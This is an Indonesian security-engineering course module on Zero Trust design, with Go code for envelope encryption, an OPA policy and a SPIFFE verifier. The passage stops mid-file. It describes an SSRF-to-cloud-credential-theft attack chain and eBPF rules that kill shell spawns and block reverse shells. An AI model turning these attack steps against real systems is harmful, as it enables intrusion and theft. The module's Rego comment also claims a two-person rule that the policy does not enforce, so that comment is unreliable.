# Kurikulum Enterprise: Keamanan Siber (07-Quality-and-Security)
## Bab 01: Fondasi dan Arsitektur
### Modul 02: Deep Dive, Implementasi Lanjutan & Arsitektur Produksi

---

### 1. Learning Objectives

Setelah menyelesaikan modul ini, Principal Engineer/Security Architect diharapkan mampu:
- **Menganalisis & Mengisolasi Blast Radius:** Mengonseptualisasikan dan merekayasa arsitektur *Zero Trust Architecture* (ZTA) tingkat lanjut pada tingkat *transport*, *runtime*, dan *data storage* untuk menekan *lateral movement* penyerang hingga 0% toleransi kegagalan perimeter.
- **Mengimplementasikan Workload Identity:** Membangun sistem atestasi beban kerja (*workload attestation*) berbasis standar IETF SPIFFE/SPIRE menggunakan *cryptographic identity* (SVID) yang bebas dari kredensial statis (*zero static credentials*).
- **Mendesain Engine Otorisasi Terdistribusi:** Mengintegrasikan Open Policy Agent (OPA) berbasis *Attribute-Based Access Control* (ABAC) dan *Relationship-Based Access Control* (ReBAC) secara sinkron pada *data plane proxy* via gRPC.
- **Mengamankan Data Plane Menggunakan Envelope Encryption:** Merekayasa sistem manajemen kunci bertingkat (*Key Encryption Key* / *Data Encryption Key*) dengan integrasi Hardware Security Module (HSM) / Cloud KMS untuk menjamin kerahasiaan data *at-rest* pada skala petabyte.
- **Menegakkan Kernel-Level Runtime Security:** Mengonfigurasi dan memvalidasi *telemetry baseline* sistem menggunakan eBPF untuk deteksi anomali pada *syscall boundary* secara *real-time*.

---

### 2. Prerequisites

Sebelum mempelajari modul ini, praktisi harus memiliki pemahaman mendalam pada:
- **Jaringan Lanjutan:** Model OSI, TCP/IP handshake, TLS 1.3 cryptographic handshakes (ECDHE, ALPN, Session Resumption, PSK), serta arsitektur reverse proxy/L7 Envoy.
- **Kriptografi Terapan:** Kriptografi asimetris (RSA-4096, ECDSA P-256, Ed25519), simetris (AES-256-GCM, ChaCha20-Poly1305), X.509 RFC 5280, serta arsitektur Public Key Infrastructure (PKI).
- **Sistem Operasi & Kernel Linux:** Linux namespaces (cgroups, network, mount), Linux Security Modules (LSM), *system calls* (seperti `ptrace`, `execve`, `bpf`), serta arsitektur eBPF.
- **Bahasa Pemrograman:** Pemrograman Go tingkat lanjut (konkurensi, memory pointer, gRPC, crypto standard library) dan sintaks deklaratif Rego (OPA).
- **Infrastruktur Modern:** Arsitektur orkestrasi kontainer Kubernetes (CRD, Mutating/Validating Webhooks, Service Mesh concepts).

---

### 3. Concept & Internal Architecture (Mendalam)

Implementasi arsitektur keamanan produksi modern bertumpu pada pergeseran paradigma dari *Perimeter-Based Security* (Castle-and-Moat) menuju *Zero Trust Architecture* (NIST SP 800-207). Tiga fondasi internal arsitektur produksi adalah:

#### A. Cryptographic Workload Identity (SPIFFE/SPIRE)
Dalam sistem terdistribusi skala besar, alamat IP bersifat efemer dan tidak dapat dipercaya sebagai basis autentikasi. SPIFFE (*Secure Production Identity Framework for Everyone*) mendefinisikan standar interoperabilitas untuk menerbitkan identitas kriptografis bagi beban kerja komputasi:
- **SPIFFE ID:** URI terstruktur yang merepresentasikan identitas beban kerja (contoh: `spiffe://acme.internal/ns/payment/sa/ledger-service`).
- **SVID (SPIFFE Verifiable Identity Document):** Dokumen identitas yang dapat divalidasi, umumnya berupa sertifikat X.509 (X509-SVID) atau token JWT (JWT-SVID).
- **Arsitektur Node & Workload Attestation:**
  1. *SPIRE Server* bertindak sebagai Certificate Authority (CA) lokal/organisasi yang mengelola *registration entries*.
  2. *SPIRE Agent* berjalan sebagai daemon di setiap simpul (node/compute host). Agent mengumpulkan *attestation data* dari kernel OS (PID, UID, GID, cgroup membership, container namespace) untuk membuktikan integritas node ke SPIRE Server (*Node Attestation*).
  3. Aplikasi (beban kerja) berkomunikasi dengan SPIRE Agent melalui Unix Domain Socket (UDS) lokal menggunakan SPIFFE Workload API. Karena UDS mendukung `SO_PEERCRED` pada Linux kernel, SPIRE Agent dapat mengekstrak UID/PID proses penanya secara deterministik tanpa token otentikasi awal (*Zero Secret Bootstrapping*), lalu menerbitkan X509-SVID ke *in-memory buffer* beban kerja.

```
+-------------------------------------------------------------------------------+
|                             SPIRE ARCHITECTURE                                |
|                                                                               |
|  +-----------------------+                    +----------------------------+  |
|  |     SPIRE Server      |<=== Node Attest ===|        SPIRE Agent         |  |
|  |  (Private Key / CA)   |    (e.g., AWS IID) | (DaemonSet / Node Local)   |  |
|  +-----------------------+                    +--------------+-------------+  |
|             ^                                                |                |
|             | Sync Registration Keys                         | Workload API   |
|             v                                                | (UNIX Socket)  |
|  +-----------------------+                    +--------------v-------------+  |
|  | Datastore (Postgres)  |                    | Workload Container         |  |
|  | Policy Definitions    |                    | Kernel PID/UID Validated   |  |
|  +-----------------------+                    +----------------------------+  |
+-------------------------------------------------------------------------------+
```

#### B. Dynamic Policy Enforcement (OPA via gRPC)
Keamanan aplikasi enterprise memisahkan *Policy Decision Point* (PDP) dari *Policy Enforcement Point* (PEP):
- PEP diinjeksikan pada layer jaringan (Envoy proxy filter) atau API gateway.
- PDP dijalankan oleh Open Policy Agent (OPA) yang dikompilasi secara native atau diakses via RPC latensi rendah. OPA mengevaluasi payload JSON (input konteks: pengguna, resource, aksi, sertifikat mTLS, atribut waktu) terhadap *policy documents* yang ditulis dalam bahasa deklaratif Rego.
- Kompilasi AST (Abstract Syntax Tree) Rego dioptimalkan ke format *in-memory rule-indexing*, memastikan pencarian aturan kompleks selesai dalam waktu sub-milidetik (<1ms) tanpa dependensi jaringan eksternal.

#### C. Envelope Encryption & Key Hierarchy
Untuk menghindari dekripsi data masif langsung oleh kunci utama (*Master Key*), industri menggunakan arsitektur enkripsi amplop (*envelope encryption*):
1. **Master Key / Key Encryption Key (KEK):** Kunci asimetris atau simetris 256-bit yang tidak pernah meninggalkan batas fisik HSM/KMS.
2. **Data Encryption Key (DEK):** Kunci simetris temporer (AES-256-GCM) yang dihasilkan secara kriptografis (*CSPRNG*) lokal untuk mengenkripsi payload data sebenarnya.
3. **Mekanisme Penyimpanan:** DEK dienkripsi menggunakan KEK melalui KMS API. Payload data yang terenkripsi disimpan bersama DEK terenkripsi (*Ciphertext + Encrypted DEK + Initialization Vector + Auth Tag*). Kunci DEK *plaintext* langsung dihapus dari memori RAM setelah operasi kriptografi selesai.

---

### 4. Why & What

| Dimensi Arsitektur | Model Tradisional (Castle-and-Moat) | Model Produksi Modern (Zero Trust & Cryptographic Identity) |
| :--- | :--- | :--- |
| **Batas Keamanan (Perimeter)** | Berbasis IP/CIDR Subnet, VPN, Firewall Layer 4 | Identitas Kriptografis (mTLS via SPIFFE/X.509), Context-Aware Identity |
| **Distribusi Kredensial** | Static API Keys, Password DB, Long-lived Service Account Tokens | Ephemeral Short-Lived Certificates (< 1 jam), Otomatisasi Rotasi In-Memory |
| **Model Otorisasi** | Hardcoded RBAC di kode aplikasi, evaluasi token JWT statis | Decoupled ABAC/ReBAC via OPA, verifikasi atribut kontinu |
| **Visibilitas Runtime** | Log aplikasi manual, Log firewall pasif pasca-insiden | eBPF kernel event interception, real-time syscall blocking & alerting |
| **Mitigasi Blast Radius** | Penyerang di dalam VPC dapat mengakses port internal lateral | Micro-segmentation: Penyerang diisolasi karena tidak memiliki X509-SVID valid |

#### Urgensi Finansial & Operasional
- **Mencegah Supply Chain & Lateral Attack:** Kasus eksfiltrasi data sering terjadi bukan pada edge ingress, melainkan akibat penyerang mengeksploitasi celah RCE (Remote Code Execution) kecil pada satu servis tidak kritikal, lalu bergerak bebas melalui subnet privat yang terbuka.
- **Kepatuhan Regulasi (Compliance):** Standar industri (PCI-DSS 4.0, HIPAA, ISO 27001, SOC2) mewajibkan enkripsi end-to-end, pemisahan tugas (*segregation of duties*), dan pencatatan audit yang tidak dapat diubah (*tamper-proof audit trails*).

---

### 5. How (Workflow Detail)

Berikut adalah *end-to-end lifecycle* permintaan masuk pada infrastruktur microservices perbankan modern:

```
[Inbound Client]
       |
       v (HTTPS / TLS 1.3)
[API Gateway (PEP)] 
       |
       +---> (1) Query PDP (OPA) ---> [Evaluate Auth Context] 
       |                                      |
       |<--- (2) Allow/Deny + Audit Log <-----+
       |
       v (3) Forward Request via mTLS (X509-SVID Mutual Auth)
[Payment Service (Envoy Sidecar)]
       |
       |---> (4) Read In-Memory Cached Decrypted SVID (from SPIRE Agent via UDS)
       |---> (5) Mutual TLS Handshake (Cipher: TLS_AES_256_GCM_SHA384)
       |---> (6) Kernel eBPF Probes validate no unapproved syscalls
       |
       v
[Application Business Logic]
       |
       v (7) Envelope Encryption for Sensitive Storage
[Local AES-256 Engine] <---> [Cloud KMS / HSM] (Generate DEK via KEK)
       |
       v
[Persistent Storage (Encrypted Payload + Encrypted DEK)]
```

#### Langkah-langkah Alur Kerja:
1. **Node & Workload Bootstrapping:** Saat kontainer *Payment Service* dinyalakan, daemon SPIRE Agent memverifikasi integritas kontainer melalui cgroup ID dan metadata Linux Kernel. SPIRE Agent menerbitkan X509-SVID ke *in-memory shared mount* kontainer.
2. **Ingress Filtering & Policy Decision:** Permintaan masuk dicegat oleh Envoy Proxy API Gateway. Envoy mengirimkan query gRPC terenkripsi ke Open Policy Agent lokal. OPA mengevaluasi identitas penelepon, klaim scope, riwayat rate-limit, dan kondisi transaksi.
3. **Micro-Segmentation Handshake:** Permintaan diteruskan ke *Payment Service*. Keduanya menegosiasikan mTLS secara bilateral. Envoy dari kedua belah pihak memverifikasi sertifikat X.509 masing-masing terhadap SPIFFE Trust Bundle root. Sambungan TCP langsung diputus (*RST*) jika identitas SPIFFE tidak sesuai dengan aturan matriks komunikasi layanan.
4. **Runtime Surveillance:** Selama eksekusi, program eBPF yang terpasang pada `sys_enter_execve`, `sys_enter_connect`, dan `security_file_open` memantau proses *Payment Service*. Jika proses mencoba melakukan spawn binary `/bin/sh` atau membuka file konfigurasi di luar direktori yang diizinkan, eBPF probe langsung mengirim sinyal `SIGKILL` dan mengirim *telemetry event* ke SIEM.
5. **Data Protection at Rest:** Sebelum data transaksi disimpan ke database, modul enkripsi amplop meminta DEK baru ke KMS, mengenkripsi field sensitif (nomor akun, identitas finansial), lalu menyimpan ciphertext dengan format terstruktur.

---

### 6. Analogy & Diagram ASCII

#### Analogi Konseptual
Bayangkan sebuah fasilitas militer bawah tanah berkategori *Top Secret*:
- **Model Tradisional:** Gerbang luar dijaga ketat. Begitu seseorang berhasil masuk gerbang luar (meskipun menyamar sebagai kurir katering), seluruh pintu ruangan di dalam bunker tidak terkunci dan dapat diakses bebas.
- **Model Zero Trust (Modul Ini):** Tidak ada pintu gerbang luar yang mutlak. Setiap koridor memiliki pintu biometrik. Setiap individu memakai lencana digital (SVID) yang berubah setiap 10 menit. Lencana ini dikeluarkan oleh petugas keamanan internal (SPIRE) yang langsung mengecek sidik jari dan DNA Anda ke sistem pusat (Attestation). Untuk membuka setiap laci dokumen (Enkripsi Data), petugas arsip harus meminta kunci laci sekali pakai dari brankas pusat (KMS Envelope Encryption). Kamera pengawas di lorong dilengkapi sensor otomatis (eBPF) yang akan langsung menembakkan bius seketika jika ada gerakan mencurigakan di luar jalur resmi, terlepas dari lencana apa yang dikenakan.

#### Diagram Komprehensif Zero Trust Arsitektur

```
+--------------------------------------------------------------------------------------------------+
|                                    KUBERNETES SECURE NODE                                        |
|                                                                                                  |
|  +--------------------------------------------------------------------------------------------+  |
|  | KERNEL SPACE                                                                               |  |
|  |  +--------------------------------------------------------------------------------------+  |  |
|  |  | eBPF Engine (Tetragon/Cilium Probe)                                                  |  |  |
|  |  | Traps: sys_enter_execve(), sys_enter_connect(), security_socket_bind()                    |  |  |
|  |  +-------------------------------------------+------------------------------------------+  |  |
|  +----------------------------------------------|---------------------------------------------+  |
|                                                 | (Kill / Block Signal)                          |
|  +----------------------------------------------v---------------------------------------------+  |
|  | USER SPACE                                                                                 |  |
|  |                                                                                            |  |
|  |  +-------------------------+                     +--------------------------------------+  |  |
|  |  |   SPIRE AGENT DAEMON    |                     |       ENVOY DATA PLANE PROXY         |  |  |
|  |  |  - Reads /proc/$PID     |                     |                                      |  |  |
|  |  |  - Unix Domain Socket   |<==== Secret Sync ===| - Mutual TLS Termination (mTLS)      |  |  |
|  |  |  - Rotates SVIDs in RAM |      (Envoy SDS)    | - Enforces SPIFFE SAN Validation     |  |  |
|  |  +-------------------------+                     +-------------------+------------------+  |  |
|  |                                                                      |                     |  |
|  |                                                                      | gRPC Check          |  |
|  |  +---------------------------------------+                           v                     |  |
|  |  |      CORE APPLICATION CONTAINER       |               +----------------------+          |  |
|  |  |                                       |               |   OPEN POLICY AGENT  |          |  |
|  |  |  - In-process Envelope Encryption     |<-- Clear Text |       (Local PDP)    |          |  |
|  |  |  - Strict Zero Static Credentials     |    Payload    | - Dynamic ABAC Rules |          |  |
|  |  |  - AES-256-GCM Implementation         |   (Localhost) | - Rego Engine        |          |  |
|  |  +-------------------+-------------------+               +----------------------+          |  |
|  |                      |                                                                     |  |
|  +----------------------|---------------------------------------------------------------------+  |
+-------------------------|------------------------------------------------------------------------+
                          | Encrypted Storage Call
                          v
        +-----------------------------------+
        | DATABASE / OBJECT STORAGE CLOUD   |
        | [IV] [Encrypted DEK] [Ciphertext] |
        +-----------------------------------+
```

---

### 7. Simple Example & Practical Example (Industrial Grade)

Berikut adalah implementasi sistem produksi backend Go yang menerapkan **Envelope Encryption** menggunakan AES-256-GCM terisolasi memori, dipadukan dengan modul evaluasi kebijakan otorisasi internal berbasis **Rego (Open Policy Agent)**.

#### File: `security/envelope_crypto.go`
Engine kriptografi envelope lokal yang aman dengan penanganan memory zeroing untuk mencegah *dumping memory attack*.

```go
package security

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"errors"
	"fmt"
	"io"
)

var (
	ErrDecryptionFailed = errors.New("cryptographic verification failed: ciphertext altered or invalid key")
	ErrInvalidDEKLength = errors.New("dek must be exactly 32 bytes for AES-256")
)

// KMSClient Interface untuk abstraksi AWS KMS, GCP KMS, atau HashiCorp Vault Transit
type KMSClient interface {
	GenerateDataKey(keyID string) (plaintextDEK []byte, ciphertextDEK []byte, err error)
	DecryptDataKey(ciphertextDEK []byte, keyID string) (plaintextDEK []byte, err error)
}

// EnvelopePayload menyimpan representasi terenkripsi dari data at-rest
type EnvelopePayload struct {
	EncryptedDEK []byte `json:"encrypted_dek"`
	Nonce        []byte `json:"nonce"`
	Ciphertext   []byte `json:"ciphertext"`
}

type EnvelopeEngine struct {
	kmsClient KMSClient
	masterKey string
}

func NewEnvelopeEngine(kms KMSClient, masterKeyID string) *EnvelopeEngine {
	return &EnvelopeEngine{
		kmsClient: kms,
		masterKey: masterKeyID,
	}
}

// zeroBytes membersihkan memory buffer dari RAM secara deterministik
func zeroBytes(b []byte) {
	for i := range b {
		b[i] = 0
	}
}

// Encrypt mengenkripsi plaintext menggunakan DEK lokal baru yang diperoleh dari KMS
func (e *EnvelopeEngine) Encrypt(plaintext []byte) (*EnvelopePayload, error) {
	plainDEK, cipherDEK, err := e.kmsClient.GenerateDataKey(e.masterKey)
	if err != nil {
		return nil, fmt.Errorf("kms dek generation failed: %w", err)
	}
	defer zeroBytes(plainDEK) // Wajib: Hancurkan plaintext DEK dari memory setelah fungsi selesai

	if len(plainDEK) != 32 {
		return nil, ErrInvalidDEKLength
	}

	block, err := aes.NewCipher(plainDEK)
	if err != nil {
		return nil, fmt.Errorf("failed to init aes block: %w", err)
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("failed to init gcm: %w", err)
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, fmt.Errorf("failed to generate random nonce: %w", err)
	}

	// Encrypt dan Append auth tag secara otomatis menggunakan Galois/Counter Mode
	ciphertext := gcm.Seal(nil, nonce, plaintext, nil)

	return &EnvelopePayload{
		EncryptedDEK: cipherDEK,
		Nonce:        nonce,
		Ciphertext:   ciphertext,
	}, nil
}

// Decrypt meminta KMS membuka DEK, kemudian mendekripsi ciphertext
func (e *EnvelopeEngine) Decrypt(payload *EnvelopePayload) ([]byte, error) {
	plainDEK, err := e.kmsClient.DecryptDataKey(payload.EncryptedDEK, e.masterKey)
	if err != nil {
		return nil, fmt.Errorf("kms dek unwrapping failed: %w", err)
	}
	defer zeroBytes(plainDEK)

	block, err := aes.NewCipher(plainDEK)
	if err != nil {
		return nil, fmt.Errorf("failed to init aes block: %w", err)
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("failed to init gcm: %w", err)
	}

	plaintext, err := gcm.Open(nil, payload.Nonce, payload.Ciphertext, nil)
	if err != nil {
		return nil, ErrDecryptionFailed
	}

	return plaintext, nil
}
```

#### File: `policy/pdp.go`
Penyematan Open Policy Agent langsung ke *in-process engine* menggunakan library Go OPA resmi untuk evaluasi latensi ultra-rendah (<150 mikrosekon).

```go
package policy

import (
	"context"
	"errors"
	"fmt"

	"github.com/open-policy-agent/opa/rego"
)

var ErrUnauthorized = errors.New("access denied by dynamic security policy")

// PolicyEngine mengelola in-memory compiled Rego query
type PolicyEngine struct {
	preparedQuery rego.PreparedEvalQuery
}

// Rego Policy Definition untuk Microservice Zero-Trust Access
const rbacPolicy = `
package authz

default allow = false

# Ambil metadata identity dari SPIFFE ID yang tervalidasi di mTLS layer
spiffe_valid {
    startswith(input.spiffe_id, "spiffe://bank.corp/ns/")
}

# Rule 1: Service ke Service komunikasi yang legal
allow {
    spiffe_valid
    input.method == "POST"
    input.path == "/v1/settlement/process"
    input.spiffe_id == "spiffe://bank.corp/ns/payment/sa/checkout-engine"
    input.risk_score < 75
}

# Rule 2: Super Admin Access dengan Two-Man Rule / High Assurance
allow {
    spiffe_valid
    input.role == "auditor"
    input.method == "GET"
    startswith(input.path, "/v1/audit/logs")
}
`

func NewPolicyEngine(ctx context.Context) (*PolicyEngine, error) {
	query, err := rego.New(
		rego.Query("data.authz.allow"),
		rego.Module("zero_trust_policy.rego", rbacPolicy),
	).PrepareForEval(ctx)

	if err != nil {
		return nil, fmt.Errorf("failed to compile rego policy: %w", err)
	}

	return &PolicyEngine{preparedQuery: query}, nil
}

type AuthRequest struct {
	SpiffeID  string `json:"spiffe_id"`
	Method    string `json:"method"`
	Path      string `json:"path"`
	Role      string `json:"role"`
	RiskScore int    `json:"risk_score"`
}

func (pe *PolicyEngine) Authorize(ctx context.Context, req AuthRequest) (bool, error) {
	results, err := pe.preparedQuery.Eval(ctx, rego.EvalInput(req))
	if err != nil {
		return false, fmt.Errorf("eval query failed: %w", err)
	}

	if len(results) == 0 || len(results[0].Expressions) == 0 {
		return false, nil
	}

	allowed, ok := results[0].Expressions[0].Value.(bool)
	if !ok || !allowed {
		return false, ErrUnauthorized
	}

	return true, nil
}
```

---

### 8. Real World Case Study (Enterprise Scale)

#### Kasus: Eksfiltrasi Lateral Movement & Migrasi Zero Trust Tier-1 Digital Banking
- **Latar Belakang:** Sebuah bank digital skala nasional memproses 45 juta transaksi harian dengan 850 microservices yang berjalan di atas Kubernetes multi-cluster.
- **Insiden Keamanan Awal:**
  Penyerang mengeksploitasi celah kerentanan SSRF (Server-Side Request Forgery) pada servis pelaporan publik (Reporting Service). Servis ini berada dalam flat VPC yang sama dengan Core Banking Database dan Payment Engine. Penyerang mengakses metadata instance AWS, mencuri IAM Role node, dan menggunakan koneksi internal HTTP polos antar-pod untuk menyuntikkan instruksi transfer dana ke Payment Engine. Kerugian potensial: USD 12 Juta.
- **Rencana Transformasi Arsitektur:**
  1. *Eradikasi Static IAM & IP-whitelisting:* Mengganti semua otentikasi IP antar-pod dengan mutual TLS (mTLS) berbasis identitas SPIFFE/SPIRE.
  2. *Envoy Secret Discovery Service (SDS):* Mengintegrasikan Envoy proxy sebagai *sidecar* di 850 pods untuk menarik ephemeral X509-SVID langsung dari SPIRE Agent (masa aktif sertifikat disetel hanya 1 jam).
  3. *Enforce Strict Micro-Segmentation:* Jika pod Reporting Service diretas kembali, pod tersebut tidak memiliki kredensial mTLS yang sah untuk berbicara ke Payment Engine. Envoy pada Payment Engine langsung menolak TCP handshake di tingkat L4 TLS.
  4. *Dynamic ABAC Authorization:* Di tingkat L7, Envoy mengeksekusi OPA via gRPC. Transaksi pembayaran bernilai > USD 10.000 wajib membawa *cryptographic intent token* dari Fraud Engine.
  5. *eBPF Process Lockdown:* Pemasangan Tetragon pada host kernel. Tetragon mendeteksi syscall `execve` biner yang tidak lazim di dalam namespace kontainer, memblokir eksekusi reverse-shell dalam 12 mikrosekon.
- **Hasil:**
  - Audit kepatuhan PCI-DSS 4.0 lolos tanpa temuan minor.
  - Zero lateral movement: Uji coba Red Team independen membuktikan penguasaan kontainer ingress tidak memberikan akses lateral sama sekali ke jaringan internal microservice.

---

### 9. Trade-offs

| Pendekatan / Teknologi | Keuntungan (Pros) | Konsekuensi / Biaya (Cons) | Strategi Mitigasi / Ambang Batas Toleransi |
| :--- | :--- | :--- | :--- |
| **mTLS via SPIFFE/SPIRE** | Otentikasi kriptografis murni; rotasi otomatis; mitigasi spoofing IP secara penuh. | Tambahan latensi TCP Handshake; konsumsi CPU meningkat untuk proses enkripsi/dekripsi AES-NI. | Manfaatkan TLS 1.3 Session Resumption; aktifkan akselerasi instruksi CPU hardware crypto (`AES-NI` / `ARMv8 Crypto`). Target latency < 2ms per hop. |
| **OPA Decoupled PDP Engine** | Fleksibilitas policy tanpa redeploy kode; audit terpusat; evaluasi deklaratif murni. | Latensi bertambah jika evaluasi via REST JSON API; *memory footprint* bertambah di setiap pod sidecar. | Gunakan OPA In-Process Go SDK atau integrasi Envoy gRPC ExtAuthz socket lokal; dilarang keras melakukan network HTTP I/O di dalam file policy Rego. |
| **Envelope Encryption (KMS)** | Kunci KEK tidak pernah terekspos; audit trail KMS mencatat setiap dekripsi kunci data; efisiensi data masif. | Ketergantungan API KMS cloud (rate limit/throttling); latensi saat *first-fetch* pembuatan DEK. | Terapkan caching DEK lokal di RAM yang terenkripsi dan otomatis kedaluwarsa (misal: 5 menit); tangani exponential backoff untuk limit rate KMS. |
| **eBPF-Based Kernel Monitoring** | Observabilitas level-0; tidak dapat dihindari oleh penyerang di user-space; blocking instan. | Risiko instabilitas kernel jika driver buggy; konsumsi resource kernel membesar pada volume event jutaan/detik. | Batasi skema monitoring hanya pada tracepoint penting (`sys_enter_execve`, `sys_enter_connect`); gunakan kernel Linux modern (LTS ≥ 5.15). |

---

### 10. Common Mistakes & Troubleshooting

#### Kesalahan Umum Produksi (Anti-Patterns)
1. **Penerbitan SVID Berdurasi Panjang:** Memberikan sertifikat X.509 dengan masa berlaku 30-90 hari pada kontainer microservice. Jika private key bocor, *window of vulnerability* terbuka lebar. Di arsitektur produksi modern, masa aktif sertifikat SVID dibatasi maksimal 1 hingga 4 jam.
2. **Melakukan External I/O di Dalam Rule Rego:** Memanggil HTTP API eksternal dari dalam aturan Rego (`http.send`) saat mengevaluasi setiap *incoming packet*. Ini menyebabkan degradasi performa drastis (*cascading latency breakdown*). Data dependensi harus di-*pre-load* ke dalam memory OPA sebagai cache.
3. **Mengabaikan Cryptographic Memory Sanitization:** Membiarkan Plaintext Data Encryption Key (DEK) mengendap di Garbage Collector runtime Go setelah mendekripsi file. Kunci dapat dibaca melalui *core dump*, *heap dump*, atau eksploitasi celah memori seperti Heartbleed/Spectre. Selalu gunakan penulisan nol manual (`zeroBytes`) secara deterministik.
4. **Validasi Sertifikat Hanya Memeriksa Common Name (CN):** Mengabaikan pengecekan SAN (Subject Alternative Name) SPIFFE ID pada protokol mTLS, sehingga sertifikat publik sembarang yang diteken oleh CA yang sama dapat menembus filter otorisasi.

#### Panduan Diagnostik Masalah Operasional

| Gejala Masalah (Symptom) | Kemungkinan Akar Masalah (Root Cause) | Prosedur Diagnostik & Solusi |
| :--- | :--- | :--- |
| `x509: certificate has expired or is not yet valid` | Clock drift antar host node di cluster, atau rotasi SPIRE Agent terlambat akibat throttling I/O UDS socket. | 1. Sinkronisasi NTP/PTP daemon (Chrony) di seluruh node (maks skew < 50ms).<br>2. Periksa healthcheck socket UDS agent SPIRE:<br>`spire-agent api fetch x509 -socketPath /tmp/spire-agent/public/api.sock`. |
| `Envoy ExtAuthz HTTP 503 / RPC Deadline Exceeded` | Policy evaluation OPA mengalami *deadlock* atau aturan Rego memiliki kompleksitas $O(N^2)$ dalam array iteration. | 1. Aktifkan OPA profiling: jalankan `opa eval --profile`.<br>2. Pastikan aturan Rego menggunakan *set/lookup indexing* bukan traversal array linear. |
| `KMS ThrottlingException: Rate exceeded` | Aplikasi memanggil `kms:GenerateDataKey` pada setiap transaksi tanpa memadukan DEK caching logic. | 1. Implementasikan Envelope Encryption DEK Caching via memory LRU aman.<br>2. Naikkan kuota transaksi KMS pada cloud console dan implementasikan jittered backoff. |

---

### 11. Best Practices (Production Checklist)

Gunakan checklist arsitektur ini sebelum merilis sistem ke lingkungan *Production*:

#### Cryptographic Identity & Transport Security
- [ ] TLS 1.3 diterapkan secara wajib untuk seluruh komunikasi internal; cipher suite usang (RC4, 3DES, CBC mode ciphers) di-disable secara global.
- [ ] Trust Root CA didistribusikan secara aman menggunakan mekanisme atestasi perangkat keras (misal: AWS Nitro Enclaves / TPM / SPIRE Server).
- [ ] Sertifikat X.509 efemer memiliki *time-to-live* (TTL) tidak lebih dari 120 menit dengan pembaruan otomatis pada masa 50% TTL.
- [ ] Validasi *SAN URI* diwajibkan memeriksa strict format `spiffe://<trust-domain>/ns/<namespace>/sa/<serviceaccount>`.

#### Policy & Access Control (IAM/ABAC)
- [ ] Seluruh aturan otorisasi didefinisikan sebagai *Infrastructure as Code* (IaC) dan terintegrasi dalam pipeline CI/CD (Rego unit testing wajib mencapai coverage > 90%).
- [ ] Desain otorisasi menerapkan prinsip *Default Deny* (secara implisit menolak seluruh akses kecuali didefinisikan eksplisit).
- [ ] Audit trail logs untuk setiap penolakan akses (403 Forbidden) dikirimkan secara asynchronous ke immutable logging storage (WORM - Write Once Read Many).

#### Data Protection & Memory Hygiene
- [ ] Tidak ada kredensial, API key, atau certificate private key yang disimpan di environment variables atau filesystem image kontainer.
- [ ] Buffer memori penampung private key dan data plaintext DEK langsung di-overwrite dengan byte kosong (`0x00`) via pointer manipulation segera setelah operasi kriptografi selesai.
- [ ] Enkripsi amplop memanfaatkan algoritma AES-256-GCM atau ChaCha20-Poly1305 yang memiliki integritas data terotentikasi (*Authenticated Encryption with Associated Data / AEAD*).

---

### 12. Hands-on Practice

Dalam latihan ini, Anda akan membangun modul verifikasi identitas SPIFFE dan enkripsi amplop secara terisolasi.

#### Struktur Direktori
Buat direktori kerja pada sistem operasi Linux/macOS Anda:
```bash
mkdir -p hands-on/m02/pkg/crypto hands-on/m02/pkg/verifier
cd hands-on/m02
go mod init enterprise-security-m02
```

#### Langkah 1: Mock KMS Provider untuk Pengujian Lokal
Buat file `pkg/crypto/mock_kms.go`:
```go
package crypto

import (
	"crypto/rand"
	"errors"
	"io"
)

type MockKMS struct {
	MasterKey []byte
}

func NewMockKMS() *MockKMS {
	k := make([]byte, 32)
	io.ReadFull(rand.Reader, k)
	return &MockKMS{MasterKey: k}
}

func (m *MockKMS) GenerateDataKey(keyID string) ([]byte, []byte, error) {
	plainDEK := make([]byte, 32)
	if _, err := io.ReadFull(rand.Reader, plainDEK); err != nil {
		return nil, nil, err
	}
	
	// Mock XOR Masking sebagai simulasi enkripsi KMS KEK
	cipherDEK := make([]byte, 32)
	for i := range plainDEK {
		cipherDEK[i] = plainDEK[i] ^ m.MasterKey[i]
	}
	
	return plainDEK, cipherDEK, nil
}

func (m *MockKMS) DecryptDataKey(ciphertextDEK []byte, keyID string) ([]byte, error) {
	if len(ciphertextDEK) != 32 {
		return nil, errors.New("invalid ciphertext length")
	}
	plainDEK := make([]byte, 32)
	for i := range ciphertextDEK {
		plainDEK[i] = ciphertextDEK[i] ^ m.MasterKey[i]
	}
	return plainDEK, nil
}
```

#### Langkah 2: Salin File Engine Kriptografi
Salin kode dari **Seksi 7 (File: `security/envelope_crypto.go`)** ke dalam direktori:
`hands-on/m02/pkg/crypto/envelope_crypto.go`. (Pastikan deklarasi package disesuaikan menjadi `package crypto`).

#### Langkah 3: Verifikator SPIFFE SVID X.509
Buat file `pkg/verifier/spiffe_san.go`:
```go
package verifier

import (
	"crypto/x509"
	"errors"
	"fmt"
	"strings"
)

var (
	ErrNoSpiffeID    = errors.New("certificate does not contain a SPIFFE ID in SAN URI")
	ErrDomainMismatch = errors.New("trust domain does not match expected authority")
)

type SpiffeVerifier struct {
	ExpectedTrustDomain string
}

func NewSpiffeVerifier(domain string) *SpiffeVerifier {
	return &SpiffeVerifier{ExpectedTrustDomain: domain}
}

// VerifySpiffeID memvalidasi kesesuaian SAN URI dengan standar SPIFFE RFC
func (sv *SpiffeVerifier) ExtractAndVerify(cert *x509.Certificate) (string, error) {
	if len(cert.URIs) == 0 {
		return "", ErrNoSpiffeID
	}

	for _, uri := range cert.URIs {
		if uri.Scheme == "spiffe" {
			expectedPrefix := fmt.Sprintf("spiffe://%s/", sv.ExpectedTrustDomain)
			if !strings.HasPrefix(uri.String(), expectedPrefix) {
				return "", fmt.Errorf("%w: got %s, expected prefix %s", ErrDomainMismatch, uri.Host, sv.ExpectedTrustDomain)
			}
			return uri.String(), nil
		}
	}

	return "", ErrNoSpiffeID
}
```

#### Langkah 4: Eksekusi Main Driver Integration
Buat file `main.go`:
```go
package main

import (
	"bytes"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"crypto/x509/pkix"
	"fmt"
	"log"
	"math/big"
	"net/url"
	"time"

	"enterprise-security-m02/pkg/crypto"
	"enterprise-security-m02/pkg/verifier"
)

func main() {
	fmt.Println("=== 1. UJI COBA ENVELOPE ENCRYPTION ===")
	kms := crypto.NewMockKMS()
